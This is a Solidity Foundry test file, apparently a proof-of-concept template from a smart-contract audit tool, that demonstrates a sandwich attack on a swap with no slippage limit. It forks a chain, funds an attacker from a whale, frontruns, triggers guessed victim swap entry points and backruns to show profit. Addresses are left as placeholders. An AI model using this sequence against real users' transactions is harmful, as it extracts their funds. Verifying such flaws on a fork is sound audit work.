// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Sandwich attack on a zero-slippage swap
/// @notice Detector: slippage. The target (or a victim flow it exposes)
///         swaps with amountOutMin == 0. An attacker frontruns the victim
///         swap (pushing the price up), lets the victim execute at the bad
///         price, then backruns (sells) for a profit.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. The victim entry point is the guess, so
///      several swap/liquidity shapes are tried and the victim is only
///      treated as traded when their value OBSERVABLY moves. On a fork with
///      a real DEX this runs for real -- the profit is the proof.

interface IRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: DEX router, token pair, victim, funding whale.
    address public constant ROUTER = address(0);
    address public constant TOKEN_IN = address(0);
    address public constant TOKEN_OUT = address(0);
    address public constant VICTIM = address(0);
    address public constant WHALE = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// A fingerprint of the victim's value: their balances of both legs of
    /// the pair. A sandwich needs the victim's value to actually move.
    function _victimFingerprint(address who) internal view returns (uint256) {
        return uint256(keccak256(abi.encode(
            IERC20(TOKEN_OUT).balanceOf(who),
            IERC20(TOKEN_IN).balanceOf(who)
        )));
    }

    /// Try one victim entry point and accept it only when the OBSERVABLE
    /// changes, never when the call merely returns: the victim's value must
    /// actually move at the price the frontrun set. A no-op returns
    /// successfully and moves nothing.
    function _attempt(address caller, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(caller);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (!ok) return "";
        // OBSERVABLE: the victim's value moved.
        if (_victimFingerprint(caller) != before) return label;
        return "";
    }

    /// The victim's swap entry point is a GUESS; try the plausible shapes,
    /// each with a zero/unset amountOutMin.
    function _tryEntry(address victim, uint256 before) internal returns (string memory used) {
        used = _attempt(victim, before, "swap(uint256)", abi.encodeWithSignature("swap(uint256)", 100 ether));
        if (bytes(used).length > 0) return used;
        used = _attempt(victim, before, "swap(address,uint256)", abi.encodeWithSignature("swap(address,uint256)", TOKEN_IN, 100 ether));
        if (bytes(used).length > 0) return used;

        address[] memory path = new address[](2);
        path[0] = TOKEN_IN;
        path[1] = TOKEN_OUT;
        used = _attempt(
            victim,
            before,
            "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
            abi.encodeWithSignature(
                "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
                100 ether,
                0,
                path,
                victim,
                block.timestamp + 300
            )
        );
        if (bytes(used).length > 0) return used;

        used = _attempt(
            victim,
            before,
            "addLiquidity(uint256,uint256,uint256,uint256,address,uint256)",
            abi.encodeWithSignature(
                "addLiquidity(uint256,uint256,uint256,uint256,address,uint256)",
                100 ether,
                100 ether,
                0,
                0,
                victim,
                block.timestamp + 300
            )
        );
        if (bytes(used).length > 0) return used;

        used = _attempt(
            victim,
            before,
            "removeLiquidity(uint256,uint256,uint256,address,uint256)",
            abi.encodeWithSignature(
                "removeLiquidity(uint256,uint256,uint256,address,uint256)",
                100 ether,
                0,
                0,
                victim,
                block.timestamp + 300
            )
        );
        if (bytes(used).length > 0) return used;

        return "";
    }

    function test_exploit() public {
        require(ROUTER != address(0) && TOKEN_IN != address(0) && TOKEN_OUT != address(0) && VICTIM != address(0) && WHALE != address(0), "set ROUTER / tokens / VICTIM / WHALE");

        address attackerEOA = makeAddr("attacker");

        // Fund the attacker with TOKEN_IN from a whale.
        vm.prank(WHALE);
        IERC20(TOKEN_IN).transfer(attackerEOA, 200 ether);
        vm.prank(attackerEOA);
        IERC20(TOKEN_IN).approve(ROUTER, 200 ether);

        uint256 attackerInBefore = IERC20(TOKEN_IN).balanceOf(attackerEOA);

        address[] memory path = new address[](2);
        path[0] = TOKEN_IN;
        path[1] = TOKEN_OUT;
        address[] memory backPath = new address[](2);
        backPath[0] = TOKEN_OUT;
        backPath[1] = TOKEN_IN;

        // 1. Frontrun: attacker buys TOKEN_OUT, pushing the price up.
        vm.prank(attackerEOA);
        IRouter(ROUTER).swapExactTokensForTokens(100 ether, 0, path, attackerEOA, block.timestamp + 300);

        // 2. Victim swap executes at the worsened price (zero slippage).
        uint256 victimBefore = _victimFingerprint(VICTIM);
        string memory used = _tryEntry(VICTIM, victimBefore);
        console.log("victim entry point that executed at the manipulated price:", used);

        // 3. Backrun: attacker sells TOKEN_OUT back.
        uint256 outBal = IERC20(TOKEN_OUT).balanceOf(attackerEOA);
        vm.prank(attackerEOA);
        IERC20(TOKEN_OUT).approve(ROUTER, outBal);
        vm.prank(attackerEOA);
        IRouter(ROUTER).swapExactTokensForTokens(outBal, 0, backPath, attackerEOA, block.timestamp + 300);

        uint256 attackerInAfter = IERC20(TOKEN_IN).balanceOf(attackerEOA);
        console.log("attacker TOKEN_IN before:", attackerInBefore);
        console.log("attacker TOKEN_IN after:", attackerInAfter);

        // OBSERVABLE: the sandwich was profitable (the attacker's value grew).
        // This is the real economic signal -- not that any call returned.
        assertTrue(
            attackerInAfter > attackerInBefore,
            "exploit did not reproduce: the sandwich was not profitable. Victim entry points tried: swap(uint256), swap(address,uint256), swapExactTokensForTokens(uint256,uint256,address[],address,uint256), addLiquidity(uint256,uint256,uint256,uint256,address,uint256), removeLiquidity(uint256,uint256,uint256,address,uint256). This does NOT establish safety: the victim flow may have another name or arguments, the victim may swap on another venue, or the pool may be deep enough that one swap does not move the price."
        );
    }
}
